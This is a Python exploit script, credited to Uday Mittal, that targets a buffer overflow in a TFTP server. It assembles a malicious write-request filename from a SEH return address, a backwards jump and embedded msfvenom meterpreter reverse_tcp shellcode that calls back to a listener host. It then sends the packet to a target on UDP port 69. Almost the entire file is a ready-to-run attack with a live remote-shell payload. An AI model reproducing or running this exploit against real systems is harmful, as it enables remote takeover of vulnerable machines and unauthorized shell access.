
#Created by: Uday Mittal (Yaksas CSC)

#This code exploits the buffer overflow vulnerability in TFTP Server. Though it's an old vulnerability and many exploits exist for it. I created this from scratch.

#0x00409D93 - POP POP RETN
#E913FCFFFF - Jumps 1000 bytes - generated using msf-nasm_shell > jmp $-1000
#badchars - \x00\x2F
#payload - msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00\x2F' -f python



import sys
import socket

jmpback = "\xE9\x13\xFC\xFF\xFF"

buf =  ""
buf += "\xda\xc7\xd9\x74\x24\xf4\xb8\xb9\x1f\xd2\x81\x5a\x29"
buf += "\xc9\xb1\x56\x83\xea\xfc\x31\x42\x14\x03\x42\xad\xfd"
buf += "\x27\x7d\x25\x83\xc8\x7e\xb5\xe4\x41\x9b\x84\x24\x35"
buf += "\xef\xb6\x94\x3d\xbd\x3a\x5e\x13\x56\xc9\x12\xbc\x59"
buf += "\x7a\x98\x9a\x54\x7b\xb1\xdf\xf7\xff\xc8\x33\xd8\x3e"
buf += "\x03\x46\x19\x07\x7e\xab\x4b\xd0\xf4\x1e\x7c\x55\x40"
buf += "\xa3\xf7\x25\x44\xa3\xe4\xfd\x67\x82\xba\x76\x3e\x04"
buf += "\x3c\x5b\x4a\x0d\x26\xb8\x77\xc7\xdd\x0a\x03\xd6\x37"
buf += "\x43\xec\x75\x76\x6c\x1f\x87\xbe\x4a\xc0\xf2\xb6\xa9"
buf += "\x7d\x05\x0d\xd0\x59\x80\x96\x72\x29\x32\x73\x83\xfe"
buf += "\xa5\xf0\x8f\x4b\xa1\x5f\x93\x4a\x66\xd4\xaf\xc7\x89"
buf += "\x3b\x26\x93\xad\x9f\x63\x47\xcf\x86\xc9\x26\xf0\xd9"
buf += "\xb2\x97\x54\x91\x5e\xc3\xe4\xf8\x36\x20\xc5\x02\xc6"
buf += "\x2e\x5e\x70\xf4\xf1\xf4\x1e\xb4\x7a\xd3\xd9\xcd\x6d"
buf += "\xe4\x36\x75\xfd\x1a\xb7\x85\xd7\xd8\xe3\xd5\x4f\xc8"
buf += "\x8b\xbe\x8f\xf5\x59\x2a\x9a\x61\xa2\x02\xb1\x6d\x4a"
buf += "\x50\xc6\x9c\xd6\xdd\x20\xce\xb6\x8d\xfc\xaf\x66\x6d"
buf += "\xad\x47\x6d\x62\x92\x78\x8e\xa9\xbb\x13\x61\x07\x93"
buf += "\x8b\x18\x02\x6f\x2d\xe4\x99\x15\x6d\x6e\x2b\xe9\x20"
buf += "\x87\x5e\xf9\x55\xf0\xa0\x01\xa6\x95\xa0\x6b\xa2\x3f"
buf += "\xf7\x03\xa8\x66\x3f\x8c\x53\x4d\x3c\xcb\xac\x10\x74"
buf += "\xa7\x9b\x86\x38\xdf\xe3\x46\xb8\x1f\xb2\x0c\xb8\x77"
buf += "\x62\x75\xeb\x62\x6d\xa0\x98\x3e\xf8\x4b\xc8\x93\xab"
buf += "\x23\xf6\xca\x9c\xeb\x09\x39\x9f\xec\xf5\xbf\x88\x54"
buf += "\x9d\x3f\x89\x64\x5d\x2a\x09\x35\x35\xa1\x26\xba\xf5"
buf += "\x4a\xed\x93\x9d\xc1\x60\x51\x3c\xd5\xa8\x37\xe0\xd6"
buf += "\x5f\xec\x13\xac\x10\x13\xd4\x51\x39\x70\xd5\x51\x45"
buf += "\x86\xea\x87\x7c\xfc\x2d\x14\x3b\x0f\x18\x39\x6a\x9a"
buf += "\x62\x6d\x6c\x8f"



filename = "\xcc" * 515 + "\x90"*237 + buf + "\x90"*300 + "\x90"*95 + jmpback + "\xEB\xD0\x90\x90" + "\x93\x9D\x40" 
host = '192.168.43.253'
port = 69

evil = "\x00\x02" + filename + "\x00" + "netascii" +"0"


try:
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
except:
	print "socket() failed"
	sys.exit(1)

s.sendto(evil,(host,port))
